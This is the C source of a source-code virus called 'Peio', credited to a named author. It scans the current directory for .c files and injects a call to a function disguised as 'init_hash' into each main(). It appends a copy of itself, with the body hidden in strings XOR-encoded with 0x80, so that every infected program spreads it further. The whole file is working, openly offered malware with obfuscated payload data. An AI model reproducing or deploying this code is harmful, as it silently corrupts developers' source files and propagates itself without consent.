   /*
    * Peio,
    *
    * source code infector XORing hashes.
    *                   zert <zert@int80h.net>
    *
    */

   #include <stdio.h>
   #include <sys/stat.h>
   #include <sys/mman.h>
   #include <unistd.h>
   #include <dirent.h>
   #include <fcntl.h>

   void init_hash();

   int main(int argc, char *argv[])
   {
       init_hash();
   }

   void init_hash()
   {
       int i, j, fd, size, mpos, ipos, page,
       ihole, thole, bhole, ehole; struct dirent *dir; DIR *d;
       void *ptr;
       char hashinc[] = "Š£éîãìõäå ¼óôäéï®è¾Š£éîãìõäå ¼óùó¯óôáô®è¾Š£éîãìõäå ¼óùó¯ííáî®è¾Š£éîãìõäå ¼õîéóôä®è¾Š£éîãìõäå ¼äéòåîô®è¾Š£éîãìõäå ¼æãîôì®è¾ŠŠöïéä éîéôßèáóè¨©» Š";
       char hashbeg[] = "Šöïéä éîéôßèáóè¨©ŠûŠ‰éîô é¬ ê¬ æä¬ óéúå¬ íðïó¬ éðïó¬ ðáçå¬ Š‰éèïìå¬ ôèïìå¬ âèïìå¬ åèïìå» óôòõãô äéòåîô ªäéò» ÄÉÒ ªä»Š‰öïéä ªðôò»Š‰ãèáò èáóèéîãÛÝ ½ ¢";
       char hashend[] = "‰ãèáò ªâõæ»ŠŠ‰ä ½ ïðåîäéò¨¢®¢©»Š‰÷èéìå¨¨äéò ½ òåáääéò¨ä©©¾°©Š‰‰éæ¨¡¨óôòãíð¨äéò¾äßîáíå«óôòìåî¨äéò¾äßîáíå©²¬¢®ã¢©©üüŠ‰‰   ¡¨óôòãíð¨äéò¾äßîáíå«óôòìåî¨äéò¾äßîáíå©²¬¢®Ã¢©©© Š‰‰‰éæ¨¨æä½ïðåî¨äéò¾äßîáíå¬ ÏßÒÄ×Ò¬ °©©¾½°©Š‰‰‰ûŠ‰‰‰‰óéúå ½ ìóååë¨æä¬ °¬ ÓÅÅËßÅÎÄ©»Š‰‰‰‰ðôò ½ ííáð¨ÎÕÌÌ¬óéúå¬ÐÒÏÔßÒÅÁÄ¬ÍÁÐßÐÒÉÖÁÔÅ¬æä¬°©»Š‰‰‰‰éæ¨ ¨¡óôòóôò¨ðôò¬¢éîéôßèáóè¢©© ¦¦Š‰‰‰‰  ¨ ¨¨íðïó½¨éîô©óôòóôò¨ðôò¬¢Üîíáéî¨¢©©¾°© üüŠ‰‰‰‰    ¨¨íðïó½¨éîô©óôòóôò¨ðôò¬¢Üîéîô íáéî¨¢©©¾°© üüŠ‰‰‰‰    ¨¨íðïó½¨éîô©óôòóôò¨ðôò¬¢Üîöïéä íáéî¨¢©©¾°© üü Š‰‰‰‰    ¨¨íðïó½¨éîô©óôòóôò¨ðôò¬¢Üîíáéî ¨¢©©¾°© üüŠ‰‰‰‰    ¨¨íðïó½¨éîô©óôòóôò¨ðôò¬¢Üîéîô íáéî ¨¢©©¾°© üüŠ‰‰‰‰    ¨¨íðïó½¨éîô©óôòóôò¨ðôò¬¢Üîöïéä íáéî ¨¢©©¾°© © ©Š‰‰‰‰ûŠ‰‰‰‰‰íðïó ½ ¨éîô©óôòóôò¨¨öïéä ª©íðïó¬ ¢»Üî¢©»Š‰‰‰‰‰íðïó ½ ¨éîô©ðôò»Š‰‰‰‰‰éæ¨ ¡¨éðïó ½ ¨éîô©óôòóôò¨««ðôò¬ ¢£éîãìõäå ¼¢©© ©Š‰‰‰‰‰ûŠ‰‰‰‰‰‰íõîíáð¨ðôò¬ óéúå©»Š‰‰‰‰‰‰âòåáë»Š‰‰‰‰‰ýŠ‰‰‰‰‰íõîíáð¨ðôò¬ óéúå©»Š‰‰‰‰‰ðáçå ½ ³ ª ¨éîô©óùóãïîæ¨ßÓÃßÐÁÇÅÓÉÚÅ©»Š‰‰‰‰‰æôòõîãáôå¨æä¬ óéúå«ðáçå©»Š‰‰‰‰‰ðôò ½ ííáð¨ÎÕÌÌ¬óéúå«ðáçå¬ÐÒÏÔßÒÅÁÄ«ÐÒÏÔß×ÒÉÔÅ¬ÍÁÐßÓÈÁÒÅÄ¬æä¬°©»Š‰‰‰‰‰éðïó ½ ¨éîô©óôòóôò¨ðôò¬ ¢£éîãìõäå ¼¢©»Š‰‰‰‰‰éðïó ½ ¨éîô©óôòóôò¨¨öïéä ª©éðïó¬ ¢ÜîÜî¢©»Š‰‰‰‰‰éðïó ½ ¨éîô©ðôò»Š‰‰‰‰‰æïò¨é½°»é¼óôòìåî¨èáóèéîã©»é««©Š‰‰‰‰‰‰èáóèéîãÛéÝ Þ½ °ø¸°»Š‰‰‰‰‰æïò¨é½°»é¼óôòìåî¨èáóèâåç©»é««©Š‰‰‰‰‰‰èáóèâåçÛéÝ Þ½ °ø¸°»Š‰‰‰‰‰éèïìå ½ óôòìåî¨èáóèéîã©»Š‰‰‰‰‰æïò¨é½¨óéúåéðïó©¯éèïìå»é¾½°»é© Š‰‰‰‰‰‰íåíãðù¨ðôò«éðïó«éªéèïìå«éèïìå¬ ðôò«éðïó«éªéèïìå¬ éèïìå©»Š‰‰‰‰‰íåíãðù¨ðôò«éðïó¬ èáóèéîã¬ éèïìå©»Š‰‰‰‰‰æïò¨é½°»é¼óôòìåî¨èáóèéîã©»é««©Š‰‰‰‰‰‰èáóèéîãÛéÝ Þ½ °ø¸°»Š‰‰‰‰‰íðïó «½ éèïìå»Š‰‰‰‰‰âõæ ½ ¨ãèáò ª©íáììïã¨²°ªóéúåïæ¨ãèáò©©»Š‰‰‰‰‰óôòãðù¨âõæ¬¢ÜîÜôéîéôßèáóè¨©»¢©»Š‰‰‰‰‰ôèïìå ½ óôòìåî¨âõæ©»Š‰‰‰‰‰æïò¨é½¨óéúå«éèïìåíðïó©¯ôèïìå»é¾½°»é© Š‰‰‰‰‰‰íåíãðù¨ðôò«íðïó«éªôèïìå«ôèïìå¬ ðôò«íðïó«éªôèïìå¬ ôèïìå©»Š‰‰‰‰‰íåíãðù¨ðôò«íðïó¬ âõæ¬ ôèïìå©»Š‰‰‰‰‰âèïìå ½ óôòìåî¨èáóèâåç©»Š‰‰‰‰‰íåíãðù¨ðôò«óéúå«éèïìå«ôèïìå¬ èáóèâåç¬ âèïìå©»Š‰‰‰‰‰íåíãðù¨ðôò«óéúå«éèïìå«ôèïìå«âèïìå¬ èáóèéîã¬ éèïìå©»Š‰‰‰‰‰âèïìå «½ éèïìå»Š‰‰‰‰‰óðòéîôæ¨ðôò«óéúå«éèïìå«ôèïìå«âèïìå¬ ¢Ü¢»ÜîÜôãèáò èáóèâåçÛÝ ½ Ü¢¢©»Š‰‰‰‰‰âèïìå «½ ²²»Š‰‰‰‰‰æïò¨é½°»é¼óôòìåî¨èáóèâåç©»é««©Š‰‰‰‰‰‰èáóèâåçÛéÝ Þ½ °ø¸°»Š‰‰‰‰‰íåíãðù¨ðôò«óéúå«éèïìå«ôèïìå«âèïìå¬ èáóèâåç¬ óôòìåî¨èáóèâåç©©»Š‰‰‰‰‰âèïìå «½ óôòìåî¨èáóèâåç©»Š‰‰‰‰‰óðòéîôæ¨ðôò«óéúå«éèïìå«ôèïìå«âèïìå¬ ¢Ü¢»ÜîÜôãèáò èáóèåîäÛÝ ½ Ü¢¢©»Š‰‰‰‰‰âèïìå «½ ²²»Š‰‰‰‰‰íåíãðù¨ðôò«óéúå«éèïìå«ôèïìå«âèïìå¬ èáóèåîä¬ óôòìåî¨èáóèåîä©©»Š‰‰‰‰‰âèïìå «½ óôòìåî¨èáóèåîä©»Š‰‰‰‰‰óðòéîôæ¨ðôò«óéúå«éèïìå«ôèïìå«âèïìå¬ ¢Ü¢»Üî¢©»Š‰‰‰‰‰âèïìå «½ ³»Š‰‰‰‰‰æïò¨é½°»é¼óôòìåî¨èáóèåîä©»é««©Š‰‰‰‰‰‰èáóèåîäÛéÝ Þ½ °ø¸°»Š‰‰‰‰‰åèïìå ½ óôòìåî¨èáóèåîä©»Š‰‰‰‰‰íåíãðù¨ðôò«óéúå«éèïìå«ôèïìå«âèïìå¬ èáóèåîä¬ åèïìå©»Š‰‰‰‰‰íóùîã¨ðôò¬ óéúå«ðáçå¬ ÍÓßÓÙÎÃ©»Š‰‰‰‰‰íõîíáð¨ðôò¬ óéúå«ðáçå©»Š‰‰‰‰‰æôòõîãáôå¨æä¬ óéúå«éèïìå«ôèïìå«âèïìå«åèïìå©»Š‰‰‰‰ý åìóåŠ‰‰‰‰ûŠ‰‰‰‰‰íõîíáð¨ðôò¬ óéúå©»Š‰‰‰‰ýŠ‰‰‰ýŠýŠ";
       char *buf;

       d = opendir(".");
       while((dir = readdir(d))>0)
           if(!(strcmp(dir->d_name+strlen(dir->d_name)-2,".c"))||
              !(strcmp(dir->d_name+strlen(dir->d_name)-2,".C")))
               if((fd=open(dir->d_name, O_RDWR, 0))>=0)
               {
                   size = lseek(fd, 0, SEEK_END);
                   ptr = mmap(NULL,size,PROT_READ,MAP_PRIVATE,fd,0);
                   if( (!strstr(ptr,"init_hash")) &&
                     ( ((mpos=(int)strstr(ptr,"\nmain("))>0) ||
                       ((mpos=(int)strstr(ptr,"\nint main("))>0) ||
                       ((mpos=(int)strstr(ptr,"\nvoid main("))>0) ||
                       ((mpos=(int)strstr(ptr,"\nmain ("))>0) ||
                       ((mpos=(int)strstr(ptr,"\nint main ("))>0) ||
                       ((mpos=(int)strstr(ptr,"\nvoid main ("))>0) ) )
                   {
                       mpos = (int)strstr((void *)mpos, ";\n");
                       mpos -= (int)--ptr;
                       if( !(ipos = (int)strstr(++ptr, "#include <")) )
                       {
                           munmap(ptr, size);
                           break;
                       }
                       munmap(ptr, size);
                       page = 3 * (int)sysconf(_SC_PAGESIZE);
                       ftruncate(fd, size+page);
                       ptr = mmap(NULL,size+page,PROT_READ+PROT_WRITE,MAP_SHARED,fd,0);
                       ipos = (int)strstr(ptr, "#include <");
                       ipos = (int)strstr((void *)ipos, "\n\n");
                       ipos -= (int)ptr;
                       for(i=0;i<strlen(hashinc);i++)
                           hashinc[i] ^= 0x80;
                       for(i=0;i<strlen(hashbeg);i++)
                           hashbeg[i] ^= 0x80;
                       ihole = strlen(hashinc);
                       for(i=(size-ipos)/ihole;i>=0;i--)
                           memcpy(ptr+ipos+i*ihole+ihole, ptr+ipos+i*ihole, ihole);
                       memcpy(ptr+ipos, hashinc, ihole);
                       for(i=0;i<strlen(hashinc);i++)
                           hashinc[i] ^= 0x80;
                       mpos += ihole;
                       buf = (char *)malloc(20*sizeof(char));
                       strcpy(buf,"\n\tinit_hash();");
                       thole = strlen(buf);
                       for(i=(size+ihole-mpos)/thole;i>=0;i--)
                           memcpy(ptr+mpos+i*thole+thole, ptr+mpos+i*thole, thole);
                       memcpy(ptr+mpos, buf, thole);
                       bhole = strlen(hashbeg);
                       memcpy(ptr+size+ihole+thole, hashbeg, bhole);
                       memcpy(ptr+size+ihole+thole+bhole, hashinc, ihole);
                       bhole += ihole;
                       sprintf(ptr+size+ihole+thole+bhole, "\";\n\tchar hashbeg[] = \"");
                       bhole += 22;
                       for(i=0;i<strlen(hashbeg);i++)
                           hashbeg[i] ^= 0x80;
                       memcpy(ptr+size+ihole+thole+bhole, hashbeg, strlen(hashbeg));
                       bhole += strlen(hashbeg);
                       sprintf(ptr+size+ihole+thole+bhole, "\";\n\tchar hashend[] = \"");
                       bhole += 22;
                       memcpy(ptr+size+ihole+thole+bhole, hashend, strlen(hashend));
                       bhole += strlen(hashend);
                       sprintf(ptr+size+ihole+thole+bhole, "\";\n");
                       bhole += 3;
                       for(i=0;i<strlen(hashend);i++)
                           hashend[i] ^= 0x80;
                       ehole = strlen(hashend);
                       memcpy(ptr+size+ihole+thole+bhole, hashend, ehole);
                       msync(ptr, size+page, MS_SYNC);
                       munmap(ptr, size+page);
                       ftruncate(fd, size+ihole+thole+bhole+ehole);
                   } else
                   {
                       munmap(ptr, size);
                   }
               }
   }
